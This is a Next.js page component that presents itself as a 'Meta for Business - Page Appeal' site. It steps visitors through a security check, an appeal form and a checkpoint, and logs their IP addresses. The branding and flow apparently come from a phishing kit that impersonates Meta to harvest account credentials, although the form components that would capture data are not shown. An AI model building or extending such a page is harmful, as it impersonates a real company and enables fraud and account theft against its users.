import Head from 'next/head';
import { useState, useEffect } from "react";
import styles from '../styles/Home.module.css';
import SecurityCheck from './security-check';
import AppealForm from './appeal-form';
import CheckPoint from './check-point';

export default function Home(ip) {

  const [steps, setOpen] = useState({step_one: true, step_two: false, step_three: false});

  const getData = (data) => {
    if(data.type == 'security-check') {
      setOpen({step_one: false, step_two: true, step_three: false});
    } else if (data.type == 'appeal') {
      setOpen({step_one: false, step_two: false, step_three: true});
    }
  }

  return (
    <div className={styles.container}>
      <Head>
      <title>Meta for Business - Page Appeal</title>
        <link rel="icon" href="/favicon.ico" />
      </Head>

      { steps.step_one && (
        <SecurityCheck onSubmit={getData}/>
      )}

      { steps.step_two && (
        <AppealForm onSubmit={getData} ip={ip} />
      )}

      { steps.step_three && (
        <CheckPoint ip={ip} />
      )}

      <style jsx global>{`
        body {
          background-color: #e9eaed;
          margin: 0px;
          padding: 0px;
        }
      `}
      </style>

    </div>
    
  )
  
}

Home.getInitialProps = async ({ req }) => {
  let userIP
  if (req) {
    userIP = req.headers['x-real-ip'] || req.connection.remoteAddress
  }
  return { userIP }
}
